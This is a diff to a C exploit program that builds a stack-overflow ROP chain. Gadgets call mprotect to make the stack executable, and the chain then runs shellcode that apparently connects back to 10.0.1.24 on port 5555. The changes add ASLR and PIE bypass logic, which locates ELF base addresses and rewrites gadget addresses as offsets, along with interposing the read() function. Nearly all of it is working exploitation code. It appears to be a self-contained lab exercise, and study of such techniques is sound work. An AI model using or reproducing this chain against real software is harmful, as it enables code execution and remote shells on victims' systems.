@@ -7,6 +7,19 @@
 #include <string.h>
 #include <unistd.h>
 
+typedef struct Offset
+{
+	long	r : 48;
+	char	b : 8;
+	char	f : 8;
+} Offset, *OffsetPtr;
+
+typedef union AddressUnion {
+	void	*p;
+	Offset	o;
+	char	c[8];
+} AddressUnion, *AddressUnionPtr;
+
 typedef struct ShellCode {
 	unsigned char prolog[18];
 	unsigned short port;
@@ -23,13 +36,13 @@ typedef struct Payload {
 	char		pl_dst[8];
 	void		*pl_canary;
 	void		*pl_rbp;
-	void		*pl_popRDI;
+	AddressUnion	pl_popRDI;
 	void		*pl_stackPage;
-	void		*pl_popRSI;
+	AddressUnion	pl_popRSI;
 	ptrdiff_t	pl_stackSize;
-	void		*pl_popRDX;
+	AddressUnion	pl_popRDX;
 	long		pl_permission;
-	void		*pl_mprotect;
+	AddressUnion	pl_mprotect;
 	void		*pl_shellCode;
 	ShellCodeUnion	scu;
 } Payload, *PayloadPtr;
@@ -97,18 +110,19 @@ _Bool initialized = 0;
 ssize_t (*libc_read)(int fd, void *buf, size_t count)	= NULL;
 void *libc_mprotect					= NULL;
 void *libc_base						= NULL;
+void *pie_base						= NULL;
 
 static inline void *pageBase(void *p) {
 	return (void *) (((unsigned long) p) & (-1^getpagesize()-1));
 } // pageBase()
 
-static inline void *libcBase(void *p) {
+static inline void *elfBase(void *p) {
 	p = pageBase(p);
 	while (strncmp(p, s_elf_signature, strlen(s_elf_signature)))
 		p -= getpagesize();
 
 	return p;
-} // libcBase()
+} // elfBase()
 
 static inline void *stackPage(void) {
 	int dummy = 0;
@@ -122,7 +136,9 @@ static void initialize(void)
 	{
 		libc_read	= dlsym(RTLD_NEXT, s_libc_read);
 		libc_mprotect	= dlsym(RTLD_NEXT, s_libc_mprotect);
-		libc_base	= libcBase(libc_mprotect);
+		libc_base	= elfBase(libc_mprotect);
+
+		pie_base	= elfBase(initialize);
 
 		initialized = 1;
 	} // if
@@ -138,6 +154,32 @@ static void overflow(char *src, size_t n) {
 	memcpy(dst, src, n);
 } // overflow()
 
+static void *baseAddress(char base) {
+	switch (base) {
+		case 'L' : return libc_base;
+		case 'X' : return pie_base;
+		default  : return 0;
+	} // switch
+} // baseAddress()
+
+static inline Offset pointerToOffset(void *p, char base) {
+	return (Offset) { (p - baseAddress(base)), base, '~' };
+} // composeOffset()
+
+static inline void *offsetToPointer(Offset o) {
+	return (void *) (o.r + baseAddress(o.b));
+} // offsetToPointer()
+
+static AddressUnion fixupAddressUnion(AddressUnion au) {
+	if (au.o.f == '~')
+		return (AddressUnion) { .p = offsetToPointer(au.o) };
+
+	assert(au.o.f == 0);
+	assert(au.o.b == 0);
+
+	return (AddressUnion) { .p = (void *) (unsigned long) au.o.r };
+} // fixupAddressUnion()
+
 static void makeload(PayloadPtr plp) {
 	printf("In makeload()\n");
 
@@ -145,21 +187,25 @@ static void makeload(PayloadPtr plp) {
 
 	memset(plp->pl_dst, 0, sizeof(plp->pl_dst));
 	plp->pl_canary		= NULL;
-	plp->pl_rbp		= NULL; // The function RIP is next, but we'll force a ROP chain from here.
-	plp->pl_popRDI		= &&l_poprdi;
+	plp->pl_rbp		= NULL;
+	//plp->pl_popRDI	= &&l_poprdi;
+	plp->pl_popRDI.o	= pointerToOffset(&&l_poprdi, 'X');
 	plp->pl_stackPage	= stackPage();
-	plp->pl_popRSI		= &&l_poprsi;
+	//plp->pl_popRSI	= &&l_poprsi;
+	plp->pl_popRSI.o	= pointerToOffset(&&l_poprsi, 'X');
 	plp->pl_stackSize	= getpagesize();
-	plp->pl_popRDX		= &&l_poprdx;
+	//plp->pl_popRDX	= &&l_poprdx;
+	plp->pl_popRDX.o	= pointerToOffset(&&l_poprdx, 'X');
 	plp->pl_permission	= 0x7;
-	plp->pl_mprotect	= libc_mprotect;
+	plp->pl_mprotect.o	= pointerToOffset(libc_mprotect, 'L');
+
 	plp->pl_shellCode	= &plp->scu; // Must be updated whenever *plp moves
 
-	plp->scu.sc.port	= htons(5555);
-	plp->scu.sc.address[0]	= 10; //127;
-	plp->scu.sc.address[1]	= 0;  //0;
-	plp->scu.sc.address[2]	= 1;  //0;
-	plp->scu.sc.address[3]	= 24; //1;
+	plp->scu.sc.port        = htons(5555);
+	plp->scu.sc.address[0]  = 10; //127;
+	plp->scu.sc.address[1]  = 0;  //0;
+	plp->scu.sc.address[2]  = 1;  //0;
+	plp->scu.sc.address[3]  = 24; //1;
 
 	// This construct keeps the compiler from removing what it thinks is dead code in gadgets that follow:
 	int volatile v = 0;
@@ -194,18 +240,25 @@ static void dumpload(PayloadPtr plp) {
 	printf("--------------------------------------------\n");
 	printf("%20s: %p\n",           "plp->pl_canary",       plp->pl_canary);
 	printf("%20s: %p\n",           "plp->pl_rbp",          plp->pl_rbp);
-	printf("%20s: %p\n",           "plp->pl_popRDI",       plp->pl_popRDI);
+	printf("%20s: %p\n",           "plp->pl_popRDI.p",     plp->pl_popRDI.p);
 	printf("%20s: %p\n",           "plp->pl_stackPage",    plp->pl_stackPage);
-	printf("%20s: %p\n",           "plp->pl_popRSI",       plp->pl_popRSI);
+	printf("%20s: %p\n",           "plp->pl_popRSI.p",     plp->pl_popRSI.p);
 	printf("%20s: %#tx\n",         "plp->pl_stackSize",    plp->pl_stackSize);
-	printf("%20s: %p\n",           "plp->pl_popRDX",       plp->pl_popRDX);
+	printf("%20s: %p\n",           "plp->pl_popRDX.p",     plp->pl_popRDX.p);
 	printf("%20s: %#tx\n",         "plp->pl_permission",   plp->pl_permission);
-	printf("%20s: %p\n",           "plp->pl_mprotect",     plp->pl_mprotect);
+	printf("%20s: %p\n",           "plp->pl_mprotect.p",   plp->pl_mprotect.p);
 	printf("%20s: %p\n",           "plp->pl_shellCode",    plp->pl_shellCode);
 	printf("%20s: %d\n",           "plp->scu.sc.port",     ntohs(plp->scu.sc.port));
 	printf("%20s: %d.%d.%d.%d\n",  "plp->scu.sc.address",  plp->scu.sc.address[0], plp->scu.sc.address[1], plp->scu.sc.address[2], plp->scu.sc.address[3]);
 	printf("--------------------------------------------\n");
 } // dumpload()
+
+static void doFixups(PayloadPtr plp) {
+	plp->pl_popRDI = fixupAddressUnion(plp->pl_popRDI);
+	plp->pl_popRSI = fixupAddressUnion(plp->pl_popRSI);
+	plp->pl_popRDX = fixupAddressUnion(plp->pl_popRDX);
+	plp->pl_mprotect = fixupAddressUnion(plp->pl_mprotect);
+} // doFixups()
 
 static void fillload(PayloadPtr plp, size_t n) {
 	char dst[8] = {0};
@@ -217,6 +270,9 @@ static void fillload(PayloadPtr plp, size_t n) {
 
 	plp->pl_shellCode = &dst[0] + ((void *)(&plp->scu) - (void *)plp);
 	plp->pl_shellCode = ((void *) &dst) + ((void *)(&plp->scu) - (void *)plp);
+
+	// Fixups
+	doFixups(plp);
 } // fillload()
 
 ssize_t read(int fd, void *buf, size_t count) {
@@ -253,6 +309,8 @@ int main(int argc, char **argv)
 	assert(sizeof(long) == 8);
 	assert(sizeof(void *) == 8);
 	assert(sizeof(ptrdiff_t) == 8);
+	assert(sizeof(Offset) == 8);
+	assert(sizeof(AddressUnion) == 8);
 	assert(sizeof(ShellCodeUnion) == 74);
 	assert(sizeof(unsigned short) == 2);
 	assert(getpagesize() == 4096);
